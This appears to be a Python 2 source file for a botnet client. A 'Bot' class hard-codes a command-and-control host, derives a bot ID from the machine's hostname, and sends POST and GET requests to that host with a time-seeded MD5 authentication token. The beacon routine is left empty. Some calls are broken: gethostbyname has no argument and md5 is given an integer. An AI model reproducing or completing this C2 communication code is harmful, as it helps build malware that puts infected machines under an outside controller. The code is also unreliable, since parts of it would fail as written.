import httplib, urllib, socket, hashlib, time

class Bot(object):
    def __init__(self):
        self.hostname = socket.gethostbyname()
        self.id = hashlib.md5(self.hostname).hexdigest()
        self.c2 = 'cgboal.xyz'


    def beacon(self):
        pass


    def post(self, params, path):
        conn = httplib.HTTPConnection(self.c2)
        headers = {"Content-type": "application/x-www-form-urlencoded",
                   "Accept" : "text/plain"}
        params['auth'] = self.genTimeSeed()
        params = urllib.urlencode(params)
        conn.request('POST', path, params, headers)
        return conn.getresponse()

    def get(self, path):
        conn = httplib.HTTPConnection(self.c2)
        conn.request('GET', path)
        return conn.getresponse()


    def genTimeSeed(self):
        seed = self.roundDown(int(time.time()), 5)
        return hashlib.md5(seed).hexdigest()

    def roundDown(self, num, factor):
        return num - (num%factor)
